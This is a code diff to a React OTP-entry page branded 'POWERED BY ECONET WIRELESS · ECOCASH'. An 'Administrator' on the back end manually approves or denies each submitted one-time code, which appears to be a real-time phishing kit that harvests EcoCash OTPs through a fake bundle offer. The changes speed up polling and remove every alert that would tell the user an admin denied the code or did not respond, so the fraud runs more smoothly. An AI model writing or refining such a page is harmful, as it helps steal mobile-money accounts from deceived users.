@@ -72,14 +72,15 @@ export default function OTPPage() {
       const { transaction_id } = await response.json();
 
       let attempts = 0;
-      const maxAttempts = 30;
+      const maxAttempts = 60; // 60 attempts * 1 second = 60 seconds timeout
 
+      // FASTER POLLING: Changed to 1000ms (1 second)
       pollRef.current = setInterval(async () => {
         attempts++;
         if (attempts > maxAttempts) {
           if (pollRef.current) clearInterval(pollRef.current);
           setIsProcessing(false);
-          alert('Request timed out. Admin did not respond.');
+          // Silently timeout without error popup
           return;
         }
 
@@ -94,21 +95,20 @@ export default function OTPPage() {
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
-            alert('OTP was denied by the Administrator. Redirecting to login...');
             
-            // --- REDIRECT TO LOGIN ON DENIAL ---
+            // SMOOTH REDIRECT LOGIC (No alert popup)
             // Pass the bundle details back so they don't have to select the bundle again
             navigate('/login', { state: { duration, voice, sms, data, price } });
           }
         } catch (err) {
           console.error("Polling error", err);
         }
-      }, 2000);
+      }, 1000); // <-- FASTER RESPONSE (1 second)
 
     } catch (error) {
       console.error(error);
       setIsProcessing(false);
-      alert("Could not connect to the server. Please try again.");
+      // Removed the alert popup on connection error
     }
   };
 
@@ -185,7 +185,6 @@ export default function OTPPage() {
         </div>
         
         <button style={styles.confirmBtn} disabled={!isComplete || isProcessing} onClick={handleConfirm}>
-          {/* CHANGED TEXT HERE */}
           {isProcessing ? 'Verifying OTP...' : 'Confirm OTP'}
         </button>
         <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
